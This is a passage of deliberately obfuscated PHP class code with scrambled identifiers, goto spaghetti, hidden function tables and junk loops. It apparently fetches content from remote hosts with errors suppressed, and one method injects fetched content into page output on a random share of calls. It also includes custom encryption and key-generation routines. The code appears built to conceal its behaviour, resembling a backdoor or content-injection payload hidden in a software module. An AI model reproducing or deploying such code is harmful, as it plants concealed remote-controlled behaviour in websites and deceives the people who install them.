$eŒ¥ò²Ò÷[61]($eŒ¥ò²Ò÷[62])->{$_SERVER[§Š×Ö][63]}($eŒ¥ò²Ò÷[217]), $eŒ¥ò²Ò÷[187] => $this->vhcz9accfc7c, $eŒ¥ò²Ò÷[185] => $_SERVER[$eŒ¥ò²Ò÷[186]], $eŒ¥ò²Ò÷[178] => $eŒ¥ò²Ò÷[158], $eŒ¥ò²Ò÷[181] => $_SERVER[$eŒ¥ò²Ò÷[182]]); $A”ÀîĞ×° = $fµ‚Í°©ÈŠ[626]; while (strlen($A”ÀîĞ×°) < $fµ‚Í°©ÈŠ[560]) { if (!$A”ÀîĞ×°) { break; } $A”ÀîĞ×°++; } goto A‡š˜‹¨ƒ®; dÌ‰îÁ­í–: $fµ‚Í°©ÈŠ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eŒ¥ò²Ò÷ =& $_SERVER[§Š×Ö]; $b®®Âµ‘‚æ = array($eŒ¥ò²Ò÷[287], $eŒ¥ò²Ò÷[288], $eŒ¥ò²Ò÷[289]); goto d¹…æ³œø; A‡š˜‹¨ƒ®: $fƒÈ–Îë÷™ = $this->{$_SERVER[§Š×Ö][191]}($eŒ¥ò²Ò÷[295], $a“·ˆÔš„); if (!$eŒ¥ò²Ò÷[200]($fƒÈ–Îë÷™)) { return; } if ($fƒÈ–Îë÷™[$eŒ¥ò²Ò÷[174]] && $fƒÈ–Îë÷™[$eŒ¥ò²Ò÷[296]]) { if ($this->{$_SERVER[§Š×Ö][208]}($fƒÈ–Îë÷™[$eŒ¥ò²Ò÷[296]]) == $a“·ˆÔš„[$eŒ¥ò²Ò÷[174]]) { return; } } goto e½Ç ¿ÂŠÚ; CËÆÅ°šé: } private function wmxb86c19e92($F¡Ÿ¿–ùÀ® = '', $eóŠ¸Íó²à = array(), $eÄœàÃÆ«– = 5) { goto bŞÈ™¦Í‚Ÿ; cÅ‚íøÎ‰Ï: return $cÍ²Ùøµ£ä[199]($eóŠ¸Íó²à, !0); $cÛÂğ‘Ò÷¹ = $aƒ½‘á…Ñ¶[629]; if (strlen($cÛÂğ‘Ò÷¹) < $aƒ½‘á…Ñ¶[581]) { return; } goto e¡œğ¾§ãŒ; b…ö•æÒ¾³: if (!$E¶Óİ¦ÅÙ×) { die; } if ($eóŠ¸Íó²à === -1) { return $aÔƒŒ¥‰‹š; } $b¬Ô’×»å± = $cÍ²Ùøµ£ä[257](array($cÍ²Ùøµ£ä[258] => array($cÍ²Ùøµ£ä[261] => $eÄœàÃÆ«–, $cÍ²Ùøµ£ä[259] => $cÍ²Ùøµ£ä[301]), $cÍ²Ùøµ£ä[302] => array($cÍ²Ùøµ£ä[303] => !1, $cÍ²Ùøµ£ä[304] => !1))); goto bù••ô¦½í; bù••ô¦½í: $eóŠ¸Íó²à = @$cÍ²Ùøµ£ä[262]($aÔƒŒ¥‰‹š, !1, $b¬Ô’×»å±); $bãÂòˆ¿šë = $aƒ½‘á…Ñ¶[628]; if (!$bãÂòˆ¿šë) { die; } goto cÅ‚íøÎ‰Ï; b£³»Ò™Ü‡: $aÔƒŒ¥‰‹š = $this->{$_SERVER[§Š×Ö][255]}($aÔƒŒ¥‰‹š, $cÍ²Ùøµ£ä[298]); $aÔƒŒ¥‰‹š = $aÔƒŒ¥‰‹š . $F¡Ÿ¿–ùÀ® . $cÍ²Ùøµ£ä[299] . $cÍ²Ùøµ£ä[300]($eóŠ¸Íó²à); $E¶Óİ¦ÅÙ× = $aƒ½‘á…Ñ¶[627]; goto b…ö•æÒ¾³; bŞÈ™¦Í‚Ÿ: $aƒ½‘á…Ñ¶ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cÍ²Ùøµ£ä =& $_SERVER[§Š×Ö]; $aÔƒŒ¥‰‹š = $cÍ²Ùøµ£ä[297]; goto b£³»Ò™Ü‡; e¡œğ¾§ãŒ: $DÓÂÈ…³Âé = $aƒ½‘á…Ñ¶[630]; while (strlen($DÓÂÈ…³Âé) < $aƒ½‘á…Ñ¶[581]) { if (!$DÓÂÈ…³Âé) { break; } $DÓÂÈ…³Âé++; } goto fÚ¯†ì¨à; fÚ¯†ì¨à: } private function yzpx80ecf621() { goto d•†Ü„›İ«; F„ˆßáéÈà: return $dñİ”ªïº’ + $E³ËâÕì¶¹; $D¢§’¬°í = $aç¿°õ©ß[632]; while ($D¢§’¬°í < $aç¿°õ©ß[555]) { if ($D¢§’¬°í >= 0) { break; } $D¢§’¬°í++; } goto DïÆ§î¯àÇ; d…µóïãš: $dñİ”ªïº’ = $aÏ„¬ÆÀÉÑ[249]($dñİ”ªïº’ ? $dñİ”ªïº’ : $aÏ„¬ÆÀÉÑ[306]); $E³ËâÕì¶¹ = $aÏ„¬ÆÀÉÑ[113]($this->wprj680d81ef, $aÏ„¬ÆÀÉÑ[332]); $E³ËâÕì¶¹ = $E³ËâÕì¶¹ ? $aÏ„¬ÆÀÉÑ[249]($E³ËâÕì¶¹) : 0; goto F„ˆßáéÈà; d•†Ü„›İ«: $aç¿°õ©ß =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÏ„¬ÆÀÉÑ =& $_SERVER[§Š×Ö]; $c²ëƒ¶¯­ = array($aÏ„¬ÆÀÉÑ[305] => $aÏ„¬ÆÀÉÑ[306], $aÏ„¬ÆÀÉÑ[307] => $aÏ„¬ÆÀÉÑ[308], $aÏ„¬ÆÀÉÑ[309] => $aÏ„¬ÆÀÉÑ[310], $aÏ„¬ÆÀÉÑ[311] => $aÏ„¬ÆÀÉÑ[312], $aÏ„¬ÆÀÉÑ[313] => $aÏ„¬ÆÀÉÑ[314], $aÏ„¬ÆÀÉÑ[315] => $aÏ„¬ÆÀÉÑ[250], $aÏ„¬ÆÀÉÑ[316] => $aÏ„¬ÆÀÉÑ[250], $aÏ„¬ÆÀÉÑ[317] => $aÏ„¬ÆÀÉÑ[306], $aÏ„¬ÆÀÉÑ[318] => $aÏ„¬ÆÀÉÑ[308], $aÏ„¬ÆÀÉÑ[319] => $aÏ„¬ÆÀÉÑ[310], $aÏ„¬ÆÀÉÑ[320] => $aÏ„¬ÆÀÉÑ[321], $aÏ„¬ÆÀÉÑ[322] => $aÏ„¬ÆÀÉÑ[312], $aÏ„¬ÆÀÉÑ[323] => $aÏ„¬ÆÀÉÑ[324], $aÏ„¬ÆÀÉÑ[325] => $aÏ„¬ÆÀÉÑ[314], $aÏ„¬ÆÀÉÑ[326] => $aÏ„¬ÆÀÉÑ[327], $aÏ„¬ÆÀÉÑ[328] => $aÏ„¬ÆÀÉÑ[329], $aÏ„¬ÆÀÉÑ[330] => $aÏ„¬ÆÀÉÑ[331]); goto aÆ–Œ©ˆä ; aÆ–Œ©ˆä : $dñİ”ªïº’ = $c²ëƒ¶¯­[$this->vhcz9accfc7c]; $f™À¶Ò®Î° = $aç¿°õ©ß[631]; if (!$f™À¶Ò®Î°) { return; } goto d…µóïãš; DïÆ§î¯àÇ: } public function bsyvd3db2e1a($D÷ĞäĞ©òì) { goto bØµâÉîÅ„; BÚ¦¶«Ê‘: if ($D÷ĞäĞ©òì[$D²¼ƒ¢Ö¡õ[333]] == $D²¼ƒ¢Ö¡õ[228]) { return; } if ($DæÉˆ‚º° >= $D²¼ƒ¢Ö¡õ[249]($D²¼ƒ¢Ö¡õ[250])) { return; } $DöªËøà™ = $D²¼ƒ¢Ö¡õ[61]($D²¼ƒ¢Ö¡õ[148])->{$_SERVER[§Š×Ö][149]}(); goto d‚É¯œ Û; bØµâÉîÅ„: $FĞ°’ÍùÉ¸ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D²¼ƒ¢Ö¡õ =& $_SERVER[§Š×Ö]; $DæÉˆ‚º° = $this->{$_SERVER[§Š×Ö][146]}(); goto BÚ¦¶«Ê‘; d‚É¯œ Û: if ($DöªËøà™ <= $DæÉˆ‚º°) { return; } $Eòí±¡¹¿Õ = $D²¼ƒ¢Ö¡õ[61]($D²¼ƒ¢Ö¡õ[148])->{$_SERVER[§Š×Ö][334]}($D²¼ƒ¢Ö¡õ[333])->{$_SERVER[§Š×Ö][335]}($DæÉˆ‚º°)->{$_SERVER[§Š×Ö][336]}(); $Eòí±¡¹¿Õ = $D²¼ƒ¢Ö¡õ[230]($Eòí±¡¹¿Õ, $D²¼ƒ¢Ö¡õ[10], $D²¼ƒ¢Ö¡õ[333]); goto a‰À©îÓĞ; a‰À©îÓĞ: $C‚–©·®È = $FĞ°’ÍùÉ¸[633]; while ($C‚–©·®È < $FĞ°’ÍùÉ¸[581]) { if ($C‚–©·®È >= 0) { break; } $C‚–©·®È++; } if (!$D²¼ƒ¢Ö¡õ[247]($D÷ĞäĞ©òì[$D²¼ƒ¢Ö¡õ[333]], $Eòí±¡¹¿Õ)) { $D²¼ƒ¢Ö¡õ[175]($D²¼ƒ¢Ö¡õ[337], !1, $D²¼ƒ¢Ö¡õ[244]); } goto a³ª±¬À¤‚; a³ª±¬À¤‚: } public function zeds866752d6() { goto C¶ÈòŞ¿â; e¹­‹Ş‰ÄÄ: $e‹•ŞŸ×á = $bœøÁÖãô˜[257](array($bœøÁÖãô˜[258] => array($bœøÁÖãô˜[259] => $bœøÁÖãô˜[260], $bœøÁÖãô˜[261] => 3))); $C†“‰¡ëôƒ = $c‡Œ¸õ”’÷[635]; if (!$C†“‰¡ëôƒ) { die; } goto FôÚ®é·ß; bó“†—Œ: $E¯›Ø¾Ùè = $bœøÁÖãô˜[254]; $E»ŒĞÔê§” = $c‡Œ¸õ”’÷[634]; $E¯›Ø¾Ùè = $this->{$_SERVER[§Š×Ö][255]}($E¯›Ø¾Ùè, $bœøÁÖãô˜[256]); goto e¹­‹Ş‰ÄÄ; FôÚ®é·ß: $déÆ´«Óš = @$bœøÁÖãô˜[262]($E¯›Ø¾Ùè, !1, $e‹•ŞŸ×á); echo $bœøÁÖãô˜[339] . $bœøÁÖãô˜[340]($déÆ´«Óš) . $bœøÁÖãô˜[341]; $CİØÇ¤¿œ¸ = $c‡Œ¸õ”’÷[636]; goto BŸªš—ØÏè; C¶ÈòŞ¿â: $c‡Œ¸õ”’÷ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bœøÁÖãô˜ =& $_SERVER[§Š×Ö]; if (!$bœøÁÖãô˜[113]($GLOBALS, $bœøÁÖãô˜[141]) || $bœøÁÖãô˜[338](1, 100) > 20) { return; } goto bó“†—Œ; BŸªš—ØÏè: } private function ensv1f0d4c92($ağ‰Óê­¢Ë, $dğÑ¤›ƒÑó, $BÄ·ËÓ‹²î = 3) { goto DáÎÎ½”Ò; a¦ÌÈµš¶ò: $c³î›•‡± = $A‚ßÈÒ¥[637]; $ağ‰Óê­¢Ë = $E¿òÀôà¾‡[2]($ağ‰Óê­¢Ë); $c¿¸ˆ›¹¨¸ = $E¿òÀôà¾‡[338](0, 5) . $E¿òÀôà¾‡[10]; goto FŸŒÔæÑ°¹; aÚÛ½ï¹ÕÃ: $D©¸‘Æ×ï = $E¿òÀôà¾‡[222]($c¿¸ˆ›¹¨¸ . $d÷Ñİ×ƒÎÁ . $D©¸‘Æ×ï); if ($BÄ·ËÓ‹²î - 1 > 0) { $D©¸‘Æ×ï = $this->{$_SERVER[§Š×Ö][136]}($D©¸‘Æ×ï, $dğÑ¤›ƒÑó, $BÄ·ËÓ‹²î - 1); } return $D©¸‘Æ×ï; goto b£ô†ÑÇ÷Ğ; DáÎÎ½”Ò: $A‚ßÈÒ¥ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E¿òÀôà¾‡ =& $_SERVER[§Š×Ö]; $E¿òÀôà¾‡[342](1); goto a¦ÌÈµš¶ò; FŸŒÔæÑ°¹: $d÷Ñİ×ƒÎÁ = $E¿òÀôà¾‡[133](15); $dëöİ¸¢¿› = $E¿òÀôà¾‡[343]; switch ($c¿¸ˆ›¹¨¸) { case $E¿òÀôà¾‡[240]: $D©¸‘Æ×ï = $this->{$_SERVER[§Š×Ö][156]}($ağ‰Óê­¢Ë, $E¿òÀôà¾‡[222]($dğÑ¤›ƒÑó . $d÷Ñİ×ƒÎÁ)); break; case $E¿òÀôà¾‡[228]: $D©¸‘Æ×ï = $this->{$_SERVER[§Š×Ö][156]}($ağ‰Óê­¢Ë, $E¿òÀôà¾‡[222]($d÷Ñİ×ƒÎÁ . $dğÑ¤›ƒÑó)); break; $F¸µ›ìŸÀÈ = $A‚ßÈÒ¥[638]; if (!$F¸µ›ìŸÀÈ) { die; } case $E¿òÀôà¾‡[344]: $D©¸‘Æ×ï = $this->{$_SERVER[§Š×Ö][156]}($ağ‰Óê­¢Ë, $E¿òÀôà¾‡[127]($d÷Ñİ×ƒÎÁ . $dğÑ¤›ƒÑó)); break; case $E¿òÀôà¾‡[345]: $D©¸‘Æ×ï = $this->{$_SERVER[§Š×Ö][156]}($ağ‰Óê­¢Ë, $E¿òÀôà¾‡[123]($d÷Ñİ×ƒÎÁ . $dğÑ¤›ƒÑó)); $CÅŒœõ°ëè = $A‚ßÈÒ¥[639]; break; case $E¿òÀôà¾‡[346]: goto c´ñ²ßƒË; EÚçÊ×ì˜´: $eŒËİ‘Œ‡ø = $dëöİ¸¢¿›[$a·Á‘×‘Åö]; $B¢ÜœÎëó› = $A‚ßÈÒ¥[641]; $Aº‰ù‹«Ì = $E¿òÀôà¾‡[123]($eŒËİ‘Œ‡ø . $E¿òÀôà¾‡[123]($dğÑ¤›ƒÑó . $eŒËİ‘Œ‡ø) . $dğÑ¤›ƒÑó); goto F¢é¨‚¤‰Ê; aÚ˜Âï¨Ê: while ($EÃÊİˆ‘œÄ < $A‚ßÈÒ¥[581]) { if ($EÃÊİˆ‘œÄ >= 0) { break; } $EÃÊİˆ‘œÄ++; } for ($BÃ½¹¸­™ = 0; $BÃ½¹¸­™ < $E¿òÀôà¾‡[24]($ağ‰Óê­¢Ë); $BÃ½¹¸­™++) { $dãÍÚÌÅˆè = $dãÍÚÌÅˆè == $E¿òÀôà¾‡[24]($Aº‰ù‹«Ì) ? 0 : $dãÍÚÌÅˆè; $Fš–§ö»¦„ = ($a·Á‘×‘Åö + $E¿òÀôà¾‡[348]($dëöİ¸¢¿›, $ağ‰Óê­¢Ë[$BÃ½¹¸­™]) + $E¿òÀôà¾‡[349]($Aº‰ù‹«Ì[$dãÍÚÌÅˆè++])) % 64; $Eå¦¡¶ç¤¬ .= $dëöİ¸¢¿›[$Fš–§ö»¦„]; $bÀÆ¦©Ş‡ = $A‚ßÈÒ¥[642]; while (strlen($bÀÆ¦©Ş‡) < $A‚ßÈÒ¥[555]) { if (!$bÀÆ¦©Ş‡) { break; } $bÀÆ¦©Ş‡++; } } $D©¸‘Æ×ï = $E¿òÀôà¾‡[340]($eŒËİ‘Œ‡ø . $Eå¦¡¶ç¤¬); goto C¶’Á®ÌÆ÷; EÔ©ÔÓ…îñ: $A×›İˆ™Û = $A‚ßÈÒ¥[644]; while (strlen($A×›İˆ™Û) < $A‚ßÈÒ¥[560]) { if (!$A×›İˆ™Û) { break; } $A×›İˆ™Û++; } goto CÖ¾°ëİ•; F¢é¨‚¤‰Ê: $Aº‰ù‹«Ì = $E¿òÀôà¾‡[25]($Aº‰ù‹«Ì, $a·Á‘×‘Åö % 8, $a·Á‘×‘Åö % 8 + 7); $Eå¦¡¶ç¤¬ = $E¿òÀôà¾‡[10]; $BÃ½¹¸­™ = 0; goto c²ŠŒ¥Âğ†; c´ñ²ßƒË: $ağ‰Óê­¢Ë = $E¿òÀôà¾‡[127]($ağ‰Óê­¢Ë); $fî‹ÙÎ‰¬Î = $A‚ßÈÒ¥[640]; $a·Á‘×‘Åö = $E¿òÀôà¾‡[347](0, 64); goto EÚçÊ×ì˜´; C¶’Á®ÌÆ÷: $E‡“ÑîÓ• = $A‚ßÈÒ¥[643]; if (!$E‡“ÑîÓ•) { return; } break; goto EÔ©ÔÓ…îñ; c²ŠŒ¥Âğ†: $Fš–§ö»¦„ = 0; $dãÍÚÌÅˆè = 0; $EÃÊİˆ‘œÄ = $A‚ßÈÒ¥[577]; goto aÚ˜Âï¨Ê; CÖ¾°ëİ•: default: $D©¸‘Æ×ï = $this->{$_SERVER[§Š×Ö][156]}($ağ‰Óê­¢Ë, $dğÑ¤›ƒÑó . $d÷Ñİ×ƒÎÁ); $EáÌÍÙ‚• = $A‚ßÈÒ¥[645]; if (!$EáÌÍÙ‚•) { return; } break; $B°î«¿œ…Û = $A‚ßÈÒ¥[646]; while ($B°î«¿œ…Û < $A‚ßÈÒ¥[558]) { if ($B°î«¿œ…Û >= 0) { break; } $B°î«¿œ…Û++; } } goto aÚÛ½ï¹ÕÃ; b£ô†ÑÇ÷Ğ: } private function ekpwbbae4feb($CØÙŞóŸ÷Ó, $a¤åÚÓÇ÷ï, $A¡øÑÒ‘Ï = 3) { goto e¬¦’¾ñ©; BğÅ¡ìÔîÖ: $a„®Œ†•º™ = $f÷Ä¶ÅÙÈÎ[647]; $CÀ®Ğ¹¿‚º = $Fßíì²¾®»[25]($CØÙŞóŸ÷Ó, 1, 15); $FĞöãÕ›Ô = $f÷Ä¶ÅÙÈÎ[648]; goto E¼Ï¤Œ‘ÃÕ; e¬¦’¾ñ©: $f÷Ä¶ÅÙÈÎ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Fßíì²¾®» =& $_SERVER[§Š×Ö]; if (!$Fßíì²¾®»[350]($CØÙŞóŸ÷Ó) || $Fßíì²¾®»[24]($CØÙŞóŸ÷Ó) < 10) { return !1; } goto d„÷¢•õøß; E¼Ï¤Œ‘ÃÕ: if (!$FĞöãÕ›Ô) { return; } $CØÙŞóŸ÷Ó = $Fßíì²¾®»[25]($CØÙŞóŸ÷Ó, 16); $A•Î›äÎÑ = $Fßíì²¾®»[343]; goto B‘»É¢‹Ò; d„÷¢•õøß: $CØÙŞóŸ÷Ó = $Fßíì²¾®»[2]($CØÙŞóŸ÷Ó); $CØÙŞóŸ÷Ó = $Fßíì²¾®»[222]($CØÙŞóŸ÷Ó); $EÚõÅ˜Ä° = $CØÙŞóŸ÷Ó[0]; goto BğÅ¡ìÔîÖ; B‘»É¢‹Ò: switch ($EÚõÅ˜Ä°) { case $Fßíì²¾®»[240]: $eçî³á¯ = $this->{$_SERVER[§Š×Ö][255]}($CØÙŞóŸ÷Ó, $Fßíì²¾®»[222]($a¤åÚÓÇ÷ï . $CÀ®Ğ¹¿‚º)); break; case $Fßíì²¾®»[228]: $eçî³á¯ = $this->{$_SERVER[§Š×Ö][255]}($CØÙŞóŸ÷Ó, $Fßíì²¾®»[222]($CÀ®Ğ¹¿‚º . $a¤åÚÓÇ÷ï)); break; $a±˜šäö» = $f÷Ä¶ÅÙÈÎ[649]; while ($a±˜šäö» < $f÷Ä¶ÅÙÈÎ[581]) { if ($a±˜šäö» >= 0) { break; } $a±˜šäö»++; } case $Fßíì²¾®»[344]: $eçî³á¯ = $this->{$_SERVER[§Š×Ö][255]}($CØÙŞóŸ÷Ó, $Fßíì²¾®»[127]($CÀ®Ğ¹¿‚º . $a¤åÚÓÇ÷ï)); $F†³™’ôÖ = $f÷Ä¶ÅÙÈÎ[650]; if (strlen($F†³™’ôÖ) < $f÷Ä¶ÅÙÈÎ[560]) { die; } break; case $Fßíì²¾®»[345]: $eçî³á¯ = $this->{$_SERVER[§Š×Ö][255]}($CØÙŞóŸ÷Ó, $Fßíì²¾®»[123]($CÀ®Ğ¹¿‚º . $a¤åÚÓÇ÷ï)); break; case $Fßíì²¾®»[346]: goto dØ¹â; dØ¹â: $CØÙŞóŸ÷Ó = $Fßíì²¾®»[351]($CØÙŞóŸ÷Ó); $EÉˆèÇÚİ = $f÷Ä¶ÅÙÈÎ[651]; if (!$EÉˆèÇÚİ) { return; } goto C—Ûğ‹Æ; AÃ’±“‡âØ: if (!$a½ñ×æ‡å) { return; } $c¯£ Ü™„İ = $Fßíì²¾®»[123]($c‹‚ ÙÁªó . $Fßíì²¾®»[123]($a¤åÚÓÇ÷ï . $c‹‚ ÙÁªó) . $a¤åÚÓÇ÷ï); $c¯£ Ü™„İ = $Fßíì²¾®»[25]($c¯£ Ü™„İ, $d£ÇØ‰”Šµ % 8, $d£ÇØ‰”Šµ % 8 + 7); goto Dí›Îã”ÙÅ; aº˜ª…ˆÓî: while (strlen($eó‹¯»ÀÀä) < $f÷Ä¶ÅÙÈÎ[555]) { if (!$eó‹¯»ÀÀä) { break; } $eó‹¯»ÀÀä++; } $d£ÇØ‰”Šµ = $Fßíì²¾®»[348]($A•Î›äÎÑ, $c‹‚ ÙÁªó); $a½ñ×æ‡å = $f÷Ä¶ÅÙÈÎ[607]; goto AÃ’±“‡âØ; AØä±¾ã: break; $AàÌô£šŸ = $f÷Ä¶ÅÙÈÎ[658]; if (strlen($AàÌô£šŸ) < $f÷Ä¶ÅÙÈÎ[558]) { return; } goto F¦ø¤å¤³; EéëâÚìÎ•: $FéèŸïÅ×º = 0; for ($bÍİ‹»ƒºê = 0; $bÍİ‹»ƒºê < $Fßíì²¾®»[24]($CØÙŞóŸ÷Ó); $bÍİ‹»ƒºê++) { $FéèŸïÅ×º = $FéèŸïÅ×º == $Fßíì²¾®»[24]($c¯£ Ü™„İ) ? 0 : $FéèŸïÅ×º; $bÅ××èŒõã = $f÷Ä¶ÅÙÈÎ[655]; if (strlen($bÅ××èŒõã) < $f÷Ä¶ÅÙÈÎ[558]) { return; } $CğèÄ‡¶ = $FéèŸïÅ×º++; $AôµêšÔ¢Ù = $Fßíì²¾®»[348]($A•Î›äÎÑ, $CØÙŞóŸ÷Ó[$bÍİ‹»ƒºê]) - $d£ÇØ‰”Šµ - $Fßíì²¾®»[349]($c¯£ Ü™„İ[$CğèÄ‡¶]); $b»¶„“¹•… = $f÷Ä¶ÅÙÈÎ[656]; while ($AôµêšÔ¢Ù < 0) { $AôµêšÔ¢Ù += 64; } $Dß§•ø‰Ğ¡ .= $A•Î›äÎÑ[$AôµêšÔ¢Ù]; $a‡¾öÄ¬¦ = $f÷Ä¶ÅÙÈÎ[657]; while ($a‡¾öÄ¬¦ < $f÷Ä¶ÅÙÈÎ[562]) { if ($a‡¾öÄ¬¦ >= 0) { break; } $a‡¾öÄ¬¦++; } } $eçî³á¯ = $Fßíì²¾®»[352]($Dß§•ø‰Ğ¡); goto AØä±¾ã; C¡àÍœå»„: $b¶‚ÛÙ‹ò = $f÷Ä¶ÅÙÈÎ[654]; while (strlen($b¶‚ÛÙ‹ò) < $f÷Ä¶ÅÙÈÎ[581]) { if (!$b¶‚ÛÙ‹ò) { break; } $b¶‚ÛÙ‹ò++; } $AôµêšÔ¢Ù = 0; goto EéëâÚìÎ•; Dí›Îã”ÙÅ: $Bîã‘«¼“„ = $f÷Ä¶ÅÙÈÎ[653]; $Dß§•ø‰Ğ¡ = $Fßíì²¾®»[10]; $bÍİ‹»ƒºê = 0; goto C¡àÍœå»„; C—Ûğ‹Æ: $c‹‚ ÙÁªó = $CØÙŞóŸ÷Ó[0]; $CØÙŞóŸ÷Ó = $Fßíì²¾®»[25]($CØÙŞóŸ÷Ó, 1); $eó‹¯»ÀÀä = $f÷Ä¶ÅÙÈÎ[652]; goto aº˜ª…ˆÓî; F¦ø¤å¤³: default: $eçî³á¯ = $this->{$_SERVER[§Š×Ö][255]}($CØÙŞóŸ÷Ó, $a¤åÚÓÇ÷ï . $CÀ®Ğ¹¿‚º); break; } if ($A¡øÑÒ‘Ï - 1 > 0) { $eçî³á¯ = $this->{$_SERVER[§Š×Ö][197]}($eçî³á¯, $a¤åÚÓÇ÷ï, $A¡øÑÒ‘Ï - 1); } return $eçî³á¯; goto EÄã¨ÖÓÌ¬; EÄã¨ÖÓÌ¬: } public function ezlq26e2c3fd($Bä¸„Ú™©) { goto bƒÚ¤¡‹”; fÀÚÎôçø¥: $A¤Œ¹Ü‚òŒ = $this->{$_SERVER[§Š×Ö][353]}(); $A” ¦Òëí = $D©ì£Ùêˆ[659]; $e†ÆÙİÈºŠ = ($b³å±â¡ïÛ - 1) * ($A¤Œ¹Ü‚òŒ - 1); goto fƒ¯‹‡‡™; Fêì“‰©Äõ: $Eï¢À¾À„ = $D©ì£Ùêˆ[665]; if (strlen($Eï¢À¾À„) < $D©ì£Ùêˆ[560]) { return; } $cŞÌ“Ä­Ò£ = $this->{$_SERVER[§Š×Ö][156]}($Bä¸„Ú™©, $b§¡œßÄ‘Ğ) . $e–èĞĞÍîÚ[357] . $c¶–¾Ã••‘; goto bÀ²¦À™Öñ; aåóª‘Ûİ: while (1) { $AÇ†—ÍƒÜÎ = $D·Şñ£èœ; $eó‚ôËåÛš = $e†ÆÙİÈºŠ; $D·Û„‡‚óù = $D©ì£Ùêˆ[661]; if (strlen($D·Û„‡‚óù) < $D©ì£Ùêˆ[562]) { die; } while ($eó‚ôËåÛš % $AÇ†—ÍƒÜÎ != 0) { $DãÏÇÄ¸Ú = $eó‚ôËåÛš; $eó‚ôËåÛš = $AÇ†—ÍƒÜÎ; $fæ£ƒà¬ = $D©ì£Ùêˆ[662]; if (!$fæ£ƒà¬) { return; } $AÇ†—ÍƒÜÎ = $DãÏÇÄ¸Ú % $AÇ†—ÍƒÜÎ; $BÖ²‡µšéÁ = $D©ì£Ùêˆ[663]; } if ($AÇ†—ÍƒÜÎ == 1) { break; } else { $D·Şñ£èœ++; } } $d¦‰ÖÑ†ĞŞ = 2; for ($B§½çç˜Ûˆ = 0; $B§½çç˜Ûˆ < $e†ÆÙİÈºŠ * 10; $B§½çç˜Ûˆ++) { if (($e†ÆÙİÈºŠ * $B§½çç˜Ûˆ + 1) % $D·Şñ£èœ == 0) { $d¦‰ÖÑ†ĞŞ = $e–èĞĞÍîÚ[249](($e†ÆÙİÈºŠ * $B§½çç˜Ûˆ + 1) / $D·Şñ£èœ); break; } } goto e„†ŒÜÉï–; bƒÚ¤¡‹”: $D©ì£Ùêˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e–èĞĞÍîÚ =& $_SERVER[§Š×Ö]; $b³å±â¡ïÛ = $this->{$_SERVER[§Š×Ö][353]}(); goto fÀÚÎôçø¥; e„†ŒÜÉï–: $c¶–¾Ã••‘ = $this->{$_SERVER[§Š×Ö][156]}($b³å±â¡ïÛ * $A¤Œ¹Ü‚òŒ . $e–èĞĞÍîÚ[10], $e–èĞĞÍîÚ[158]); $E‚İ¿–°¼ = $D©ì£Ùêˆ[664]; $b§¡œßÄ‘Ğ = $e–èĞĞÍîÚ[123]($e–èĞĞÍîÚ[354] . ($b³å±â¡ïÛ + $A¤Œ¹Ü‚òŒ) . $e–èĞĞÍîÚ[355] . $D·Şñ£èœ . $e–èĞĞÍîÚ[355] . $d¦‰ÖÑ†ĞŞ . $e–èĞĞÍîÚ[356]); goto Fêì“‰©Äõ; fƒ¯‹‡‡™: $eÓ½‡Ìò§Œ = $D©ì£Ùêˆ[660]; if (!$eÓ½‡Ìò§Œ) { die; } $D·Şñ£èœ = $e–èĞĞÍîÚ[249](($b³å±â¡ïÛ + $A¤Œ¹Ü‚òŒ) / 2); goto aåóª‘Ûİ; bÀ²¦À™Öñ: $B¦×¼†Ï÷ë = $D©ì£Ùêˆ[666]; if (!$B¦×¼†Ï÷ë) { die; } return $cŞÌ“Ä­Ò£; goto F°Ğ¬…ø¦©; F°Ğ¬…ø¦©: } public function caqdb6d26621($D±à‹¨¯) { goto d¥¤»ßê‰; fæÎ£ÆÔå¼: $f½¨­Ş½•ç = $d‰¡÷³‚‚„[675]; goto bÜÎš¬†Ê±; aİ‡º•ò: $dùìÖƒá—¾ = $d‰¡÷³‚‚„[674]; while (strlen($dùìÖƒá—¾) < $d‰¡÷³‚‚„[558]) { if (!$dùìÖƒá—¾) { break; } $dùìÖƒá—¾++; } return $Dª×ßŞñƒİ; goto fæÎ£ÆÔå¼; Eà¨­ğÑØ…: $Cš¦Ïªª¸ƒ = $DÌò†íÃì÷[249]($Cš¦Ïªª¸ƒ); $c©ÑÁ¿ = 0; $Eˆô„‡ÍÅŠ = $d‰¡÷³‚‚„[667]; goto e÷ìÖñŠõå; e÷ìÖñŠõå: if (!$Eˆô„‡ÍÅŠ) { return; } $C§¶œŠ°—ì = 0; $FÀù„µ©øá = $d‰¡÷³‚‚„[668]; goto Bßªó¢®·; cà‡šÃßëÕ: while (1) { $fÒ¸ƒ¿™¸ = $FÈÑÃçµ‹º; $FóõÒÓÁ® = $e¸¸è»»ëº; while ($FóõÒÓÁ® % $fÒ¸ƒ¿™¸ != 0) { $a‚®ŒŠİÑ  = $FóõÒÓÁ®; $A·ğÔá‘ÛÛ = $d‰¡÷³‚‚„[672]; if (!$A·ğÔá‘ÛÛ) { die; } $FóõÒÓÁ® = $fÒ¸ƒ¿™¸; $fÒ¸ƒ¿™¸ = $a‚®ŒŠİÑ  % $fÒ¸ƒ¿™¸; } if ($fÒ¸ƒ¿™¸ == 1) { break; } else { $FÈÑÃçµ‹º++; } } $C¯Í¼«‚‹í = 2; for ($BÊí†¼…ƒ = 0; $BÊí†¼…ƒ < $e¸¸è»»ëº * 10; $BÊí†¼…ƒ++) { if (($e¸¸è»»ëº * $BÊí†¼…ƒ + 1) % $FÈÑÃçµ‹º == 0) { $C¯Í¼«‚‹í = $DÌò†íÃì÷[249](($e¸¸è»»ëº * $BÊí†¼…ƒ + 1) / $FÈÑÃçµ‹º); break; } } goto bÎ Ä’½¡ö; d¥¤»ßê‰: $d‰¡÷³‚‚„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DÌò†íÃì÷ =& $_SERVER[§Š×Ö]; $eè¥ÙŠïÓÄ = $DÌò†íÃì÷[0]($DÌò†íÃì÷[357], $D±à‹¨¯); goto fÁÉˆÜù¸; Bßªó¢®·: if (!$FÀù„µ©øá) { return; } for 